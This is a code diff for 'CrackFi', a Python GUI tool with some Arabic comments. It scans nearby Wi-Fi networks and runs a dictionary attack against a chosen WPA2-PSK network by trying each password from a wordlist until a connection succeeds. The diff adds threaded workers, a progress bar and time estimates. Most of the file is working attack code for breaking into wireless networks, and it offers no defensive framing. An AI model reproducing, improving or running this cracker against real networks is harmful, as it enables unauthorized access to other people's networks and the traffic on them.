@@ -1,84 +1,135 @@
 # Project Name : CrackFi
 # Version : 1.0.0v
+#------------------------------------------------------------------------------------------------------------
 
 import time
 import pywifi
-import threading
 from pywifi import *
 from hacklore import *
+from PyQt6.QtWidgets import QApplication
 
+#------------------------------------------------------------------------------------------------------------
 
+wifiNames = {}
+current_running_scan = False
+current_scan_worker = None
+current_crack_worker = None
 
-def search_wifi():
+def browse():
+    select_file = FileDialog()
+    select = select_file.openFile(caption='Select Password File Path', filter="Text Files (*.txt)")
 
-    information.setText('')
-    passowrdStatue.setText('')
+    if select:
+        passwordPath.setReadOnly(read_only=False)
+        passwordPath.setText(select)
+        passwordPath.setReadOnly(read_only=True)
 
-    # 2. بناء دالة الخلفية المسؤولة عن التحديث المستمر كل ثانية
-    def wifi_scanner_thread():
+def scan_wifi():
+    infoLabel.setText('Scanning...')
+    listView.Clear()
+    myProgress.setValue(0)
+
+    global current_running_scan, current_crack_worker, current_scan_worker
+    current_running_scan = True
+
+    def wifi_scanner_logic(progress_callback):
+        global current_running_scan, wifiNames
+
         wifi = pywifi.PyWiFi()
         iface = wifi.interfaces()[0]
-        
-        print("[*] Continuous Wi-Fi scanning started...")
-        
-        # حلقة تكرار مستمرة لتحديث الشبكات (تحديث حي)
-        while True:
-            iface.scan() # أمر كرت الشبكة ببدء البحث
-            time.sleep(1) # الانتظار ثانية واحدة لتحديث البيانات
-            
+
+        while current_running_scan:
+            iface.scan()
+            time.sleep(2)
             scan_results = iface.scan_results()
+            active_bssids_in_this_loop = set()
             
-            # مصفوفة لتخزين الأسماء الفريدة لمنع تكرار نفس اسم الشبكة في القائمة
-            discovered_ssids = []
-            
+            current_id = len(wifiNames) + 1
+
             for network in scan_results:
-                # تنظيف الاسم من المسافات المخفية
                 ssid = network.ssid.strip()
+                bssid = network.bssid
+                if not ssid: 
+                    continue
+
+                active_bssids_in_this_loop.add(bssid)
+                already_exists = any(value[1] == bssid for value in wifiNames.values())
                 
-                # تخطي الشبكات المخفية (بدون اسم) والشبكات المضافة مسبقاً في هذه الدورة
-                if ssid and ssid not in discovered_ssids:
-                    discovered_ssids.append(ssid)
+                if not already_exists:
+                    wifiNames[current_id] = [ssid, bssid]
+                    current_id += 1
             
-            # 3. تحديث الـ listView بأسماء الشبكات المكتشفة
-            # ملاحظة: إذا كانت مكتبتك المغلّفة تدعم إضافة نصوص أو مصفوفة للـ listView
-            # سنفترض أن الدالة اسمها .addItem() أو .add() أو .setItems() حسب برمجتك لها
-            
-            # هنا نقوم بمسح القائمة القديمة وإضافة القائمة المحدثة
-            listView.Clear() 
-            for name in discovered_ssids:
-                # استبدل .addItem(name) بالدالة الصحيحة في مكتبتك لإضافة عنصر للـ ListView
-                listView.add_item(name) 
-                
-            listView.scrollToBottom() # النزول التلقائي لأسفل السكرول بار الاحترافي
-            
-            # انتظام التحديث بين كل ثانية والأخرى
-            time.sleep(1)
+            display_wifi_names = []
+            for key, value in wifiNames.items():
+                if value[1] in active_bssids_in_this_loop:
+                    display_wifi_names.append(f"[ {key} ] {value[0]}")
 
-    # 4. تشغيل الدالة في خيط مستقل (Thread) فور النقر على الزر لمنع تجمد الواجهة
-    threading.Thread(target=wifi_scanner_thread, daemon=True).start()
+            progress_callback.emit(display_wifi_names)
+            time.sleep(2)
+        
+    def update_wifi_list(display_wifi_names):
+        if not display_wifi_names or not isinstance(display_wifi_names, list):
+            return
+
+        information.setText('')
+        passwordStatue.setText('')
+
+        final_text = "\n".join(display_wifi_names)
+
+        if not final_text:
+            final_text = "No networks found yet..."
+        
+        information.setText(text=final_text)
+
+    current_scan_worker = WorkerThread(wifi_scanner_logic, progress_callback=None)
+    current_scan_worker.signals.result.connect(update_wifi_list)
+    current_scan_worker.kwargs['progress_callback'] = current_scan_worker.signals.result
+    current_scan_worker.start()
 
 
-def show_wifi_info():
+def get_actual_ssid(user_input):
+    global wifiNames
+    user_input = user_input.strip()
+    
+    if user_input.isdigit():
+        for key, value in wifiNames.items():
+            if key == int(user_input):
+                return value[0]
+    return user_input
 
-    information.setText('')
-    passowrdStatue.setText('')
 
-    target_ssid = wifiName.Get()
+def get_wifi_information():
+    raw_input = wifiName.Get()
+    target_ssid = get_actual_ssid(raw_input)
 
     if not target_ssid:
-        print("[!] Please enter the network name first.\n")
+        message_box = MessageBox(title='CrackFi', text='Please enter a valid network name or ID.', icon='warning')
+        message_box.addButton(text='OK', role='accept')
+        message_box.exec()
         return
     
-    print(f"[*] Searching for network: {target_ssid}...\n")
+    global current_running_scan
+    current_running_scan = False
+
+    information.setText('')
+    passwordStatue.setText('')
+    listView.Clear()
+    myProgress.setValue(0)
+
+    listView.add_item(f'Obtaining network information {target_ssid}...')
+    infoLabel.setText('SSID Information')
+
+    app.processEvents()
 
     wifi = pywifi.PyWiFi()
     iface = wifi.interfaces()[0]
     iface.scan()
 
-    time.sleep(2)
+    for _ in range(4):
+        time.sleep(0.5)
+        app.processEvents()
 
     scan_results = iface.scan_results()
-
     network_found = None
     for network in scan_results:
         if network.ssid.strip() == target_ssid:
@@ -98,93 +149,153 @@ def show_wifi_info():
         elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPA2PSK:
             auth_type = "WPA2-PSK"
 
-        signal_strength = network_found.signal
-
         info_text = (
             f"• Name: {network_found.ssid}\n\n"
             f"• Mac Address (BSSID): {network_found.bssid.upper()}\n\n"
             f"• Encryption and security type: {auth_type}\n\n"
-            f"• Signal strength: {signal_strength} dBm\n\n\n"
+            f"• Signal strength: {network_found.signal} dBm\n\n\n"
             f"• Network information found successfully."
         )
-
         information.setText(text=info_text)
-
     else:
-        print("SSID Informations:\n\nThe network was not found.")
-        print(f"Terminal Output:\n[-] No signal was captured for this network perimeter. Check name.")
+        information.setText(text="• The network was not found.")
+        listView.add_item(f'[-] Network {target_ssid} not found. Try again.')
 
 
 def crack_wifi():
-
-    information.setText('')
-    passowrdStatue.setText('')
-
-    show_wifi_info()
-    
-    listView.Clear()
-
-    target_wifi_name = wifiName.Get()
+    raw_input = wifiName.Get()
+    target_wifi_name = get_actual_ssid(raw_input)
     target_path = passwordPath.Get()
 
     if not target_wifi_name or not target_path:
-        print("[!] Please select SSID and Password file first.\n")
+        message_box = MessageBox(title='CrackFi', text='Please select SSID (or ID) and Password file first.', icon='warning')
+        message_box.addButton(text='OK', role='accept')
+        message_box.exec()
         return
+    
+    global current_running_scan, current_crack_worker
+    current_running_scan = False
+    
+    infoLabel.setText('Cracking... 0.0%')
+    information.setText('')
+    passwordStatue.setText('')
+    listView.Clear()
+    myProgress.setValue(0)
 
-    wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0]
+    def crack_logic(progress_callback):
+        wifi = pywifi.PyWiFi()
+        iface = wifi.interfaces()[0]
 
-    with open(target_path, 'r', encoding='utf-8', errors='ignore') as file:
-        for password in file:
-            wifi_pass = password.strip()
-            if not wifi_pass:
-                continue
-
-            iface.disconnect()
-            #time.sleep(1)
-
-            profile = pywifi.Profile()
-            profile.ssid = target_wifi_name
-            profile.auth = const.AUTH_ALG_OPEN
-            profile.akm.append(const.AKM_TYPE_WPA2PSK)
-            profile.cipher = const.CIPHER_TYPE_CCMP
-            profile.key = wifi_pass
-
-            iface.remove_all_network_profiles()
-            temp_profile = iface.add_network_profile(profile)
-            iface.connect(temp_profile)
+        try:
+            # 1. حساب إجمالي عدد الكلمات في الملف لمعرفة النسبة بدقة
+            total_lines = 0
+            with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for _ in f:
+                    total_lines += 1
             
-            print(f'Trying : [ {wifi_pass} ]')
+            if total_lines == 0:
+                total_lines = 1
 
-            listView.add_item(f'Trying : [ {wifi_pass} ]')
+            start_time = time.time()
+            current_line = 0
 
-            is_connected = False
-            for _ in range(10):
-                time.sleep(0.5)
-                if iface.status() == const.IFACE_CONNECTED:
-                    is_connected = True
-                    break
-                elif iface.status() == const.IFACE_DISCONNECTED and _ > 4:
-                    break
+            with open(target_path, 'r', encoding='utf-8', errors='ignore') as file:
+                for password in file:
+                    wifi_pass = password.strip()
+                    if not wifi_pass: 
+                        continue
 
-            if is_connected:
-                print(f'\n[+] Connect successfully [ {wifi_pass} ].')
-                passowrdStatue.setText(f"• Connected Successfully.\n• Password: {wifi_pass}")
-                return
+                    current_line += 1
+                    iface.disconnect()
+                    
+                    profile = pywifi.Profile()
+                    profile.ssid = target_wifi_name
+                    profile.auth = const.AUTH_ALG_OPEN
+                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+                    profile.cipher = const.CIPHER_TYPE_CCMP
+                    profile.key = wifi_pass
 
-    print("\n[-] Finished: Password not found in the file.")
-    passowrdStatue.setText("• Finished: Password not found in the file.")
+                    iface.remove_all_network_profiles()
+                    temp_profile = iface.add_network_profile(profile)
+                    iface.connect(temp_profile)
+                    
+                    # حساب نسبة التقدم والوقت الحالي المنقضي
+                    percentage = (current_line / total_lines) * 100
+                    elapsed_time = time.time() - start_time
+                    
+                    # احتساب الوقت المتبقي تقريبياً بناءً على سرعة الفحص الحالية
+                    seconds_per_line = elapsed_time / current_line
+                    remaining_lines = total_lines - current_line
+                    estimated_seconds_left = int(remaining_lines * seconds_per_line)
 
+                    # إرسال البيانات المحدثة متضمنة النص والوقت المتبقي المنسق وقيمة الشريط
+                    progress_callback.emit({
+                        "log": f'Trying crack with this password : [ {wifi_pass} ]',
+                        "percentage": int(percentage),
+                        "time_left": estimated_seconds_left
+                    })
 
-def browse():
-    select_file = FileDialog()
-    select = select_file.openFile(caption='Select Password File Path', filter="Text Files (*.txt)")
+                    is_connected = False
+                    for _ in range(10):
+                        time.sleep(0.5)
+                        if iface.status() == const.IFACE_CONNECTED:
+                            is_connected = True
+                            break
+                        elif iface.status() == const.IFACE_DISCONNECTED and _ > 4:
+                            break
 
-    if select:
-        passwordPath.setReadOnly(read_only=False)
-        passwordPath.setText(select)
-        passwordPath.setReadOnly(read_only=True)
+                    if is_connected:
+                        return {"status": "success", "password": wifi_pass}
 
+            return {"status": "failed", "password": None}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    def on_crack_progress_received(data):
+        # تحديث قائمة الطرفية بالكلمات المجربة
+        listView.add_item(data["log"])
+        listView.scrollToBottom()
+        
+        # تحديث شريط التقدم الحقيقي
+        myProgress.setValue(data["percentage"])
+        
+        # تنسيق الوقت المتبقي إلى ثوانٍ، دقائق، أو ساعات
+        seconds_left = data["time_left"]
+        if seconds_left >= 3600:
+            hours = seconds_left // 3600
+            minutes = (seconds_left % 3600) // 60
+            seconds = seconds_left % 60
+            time_str = f"{hours}h {minutes}m {seconds}s"
+        elif seconds_left >= 60:
+            minutes = seconds_left // 60
+            seconds = seconds_left % 60
+            time_str = f"{minutes}m {seconds}s"
+        else:
+            time_str = f"{seconds_left}s"
+            
+        # تحديث الـ Label العلوي بالشكل المطلوب تماماً مع تماشي النسبة المئوية والعداد الزمني المتبقي
+        infoLabel.setText(f'Cracking... {data["percentage"]:.1f}% (Remaining: {time_str})')
+        preciseProgress.setText(f'{data["percentage"]:.1f}%')
+
+    def on_crack_finished(result):
+        if result["status"] == "success":
+            passwordStatue.setText(f"• Connected Successfully.\n• Password: {result['password']}")
+            infoLabel.setText('Cracking Finished - Success')
+
+        elif result["status"] == "failed":
+            passwordStatue.setText("• Finished: Password not found in the file.")
+            infoLabel.setText('Cracking Finished - Failed')
+        else:
+            passwordStatue.setText(f"• Error encountered: {result['message']}")
+            infoLabel.setText('Cracking Error')
+
+    current_crack_worker = WorkerThread(crack_logic, progress_callback=None)
+    current_crack_worker.signals.progress.connect(on_crack_progress_received)
+    current_crack_worker.signals.result.connect(on_crack_finished)
+    current_crack_worker.kwargs['progress_callback'] = current_crack_worker.signals.progress
+    current_crack_worker.start()
+
+#------------------------------------------------------------------------------------------------------------
 
 app = App()
 app.Style(first_style='''background-color: lightgray;''', second_style='''''')
@@ -205,13 +316,13 @@ page.Add(wifinameFrame)
 wifiName = Entry(placeholder_text='Choose The Network Number')
 wifinameFrame.addTo(wifiName)
 
-showButton = Button(text='Show info', command=lambda: show_wifi_info())
-wifinameFrame.addTo(showButton)
+scanButton = Button(text='Scan', command=lambda: scan_wifi())
+wifinameFrame.addTo(scanButton)
 
-searchButton = Button(text='Search wifi', command=lambda: search_wifi())
-wifinameFrame.addTo(searchButton)
+getButton = Button(text='Get Information', command=lambda: get_wifi_information())
+wifinameFrame.addTo(getButton)
 
-crackButton = Button(text='Crack wifi', command=lambda: threading.Thread(target=crack_wifi, daemon=True).start())
+crackButton = Button(text='Crack Wi-Fi', command=lambda: crack_wifi())
 wifinameFrame.addTo(crackButton)
 
 passwordFrame = Frame()
@@ -248,16 +359,13 @@ infoLabel = Label(text='Wi-Fi Information')
 infoLabel.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; padding-left: 5px; padding-top: 5px; padding-bottom: 2px;''', second_style='''''')
 infoFrame.addTo(infoLabel)
 
-
 information = Label(text='')
 information.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 12px; border-top: none; border-bottom: none; padding-left: 5px;''', second_style='''''')
 infoFrame.addTo(information)
 
-
-passowrdStatue = Label(text='')
-passowrdStatue.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 12px; border-top: none; border-bottom: none; padding-left: 5px;''', second_style='''''')
-infoFrame.addTo(passowrdStatue)
-
+passwordStatue = Label(text='')
+passwordStatue.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 12px; border-top: none; border-bottom: none; padding-left: 5px;''', second_style='''''')
+infoFrame.addTo(passwordStatue)
 
 termnalFrame = Frame()
 termnalFrame.Layout(layout_type='v')
@@ -267,56 +375,35 @@ termnalFrame.Style(first_style='''border: 2px solid darkslategrey;''', second_st
 termnalFrame.minWidth(min_width=500)
 boxFrame.addTo(termnalFrame)
 
-termnalLabel = Label(text='Termnal Output')
+termnalLabel = Label(text='Terminal Output')
 termnalLabel.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; padding-left: 5px; padding-top: 5px; padding-bottom: 2px;''', second_style='''''')
 termnalFrame.addTo(termnalLabel)
 
-scrollbar_style = '''
-   /* تنسيق شريط التمرير العمودي */
-    QScrollBar:vertical {
-        border: none;
-        background: lightgray;
-        width: 10px;
-        margin: 0px 0px 0px 0px;
-    }
-    QScrollBar::handle:vertical {
-        background: darkslategrey;
-        min-height: 20px;
-        border-radius: 5px;
-    }
-    QScrollBar::handle:vertical:hover {
-        background: darkslategrey;
-    }
-    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
-        height: 0px;
-    }
-    QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
-        background: none;
-    }
-
-    /* تنسيق شريط التمرير الأفقي */
-    QScrollBar:horizontal {
-        border: none;
-        background: lightgray;
-        height: 10px;
-        margin: 0px 0px 0px 0px;
-    }
-    QScrollBar::handle:horizontal {
-        background: lightgray;
-        min-width: 20px;
-        border-radius: 5px;
-    }
-    QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
-        width: 0px;
-    }
-'''
-
 listView = ListView()
-listView.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; border-top: none; outline: none; padding-right: 5px; padding-bottom: 8px;''', second_style=scrollbar_style)
+listView.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; border-top: none; outline: none; padding-right: 5px; padding-bottom: 8px;''')
 listView.Spacing(5)
 listView.scrollToBottom()
 termnalFrame.addTo(listView)
 
 
+progressFrame = Frame()
+progressFrame.Layout(layout_type='h')
+progressFrame.Align(alignment='center')
+progressFrame.Margin(left=0, top=0, right=0, bottom=0)
+progressFrame.Style(first_style='''''', second_style='''''')
+page.Add(progressFrame)
+
+
+
+myProgress = ProgressBar(minimum=0, maximum=100)
+myProgress.setTextVisible(False)
+myProgress.maxHeight(8)
+myProgress.Style(first_style="""border: none; background-color: #E0E0E0; border-radius: 4px;""", second_style="""chunk { background-color: darkslategrey; border-radius: 4px;}""")
+progressFrame.addTo(myProgress)
+
+
+preciseProgress = Label(text='0%')
+preciseProgress.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 18px; padding-right: 10px;''', second_style='''''')
+progressFrame.addTo(preciseProgress)
 
 app.Mainloop()
